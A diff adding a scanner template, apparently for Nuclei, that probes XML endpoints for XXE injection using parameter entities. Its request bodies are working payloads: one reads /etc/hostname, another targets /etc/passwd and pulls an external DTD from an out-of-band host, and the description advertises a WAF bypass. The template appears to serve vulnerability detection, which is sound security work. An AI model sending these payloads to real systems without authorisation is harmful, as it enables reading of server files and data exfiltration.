@@ -1,0 +1,53 @@
+id: xxe-parameter-entity
+info:
+  name: XXE Parameter Entity Injection
+  author: AniipID
+  severity: critical
+  description: Detects XXE using parameter entities to bypass WAF filters and extract data
+  tags: xxe,parameter-entity,xml,waf-bypass
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/parse"
+      - "{{BaseURL}}/xml/parse"
+      - "{{BaseURL}}/soap/service"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY % xxe SYSTEM "file:///etc/hostname">
+        %xxe;
+      ]>
+      <root>test</root>
+    matchers:
+      - type: word
+        words:
+          - "localhost"
+          - "hostname"
+          - "ubuntu"
+          - "debian"
+          - "centos"
+        condition: or
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/import"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % dtd SYSTEM "http://{{oob-domain}}/xxe.dtd">
+        %dtd;
+      ]>
+      <root>test</root>
+    matchers:
+      - type: word
+        words:
+          - "oob"
+          - "xxe"
+        condition: or
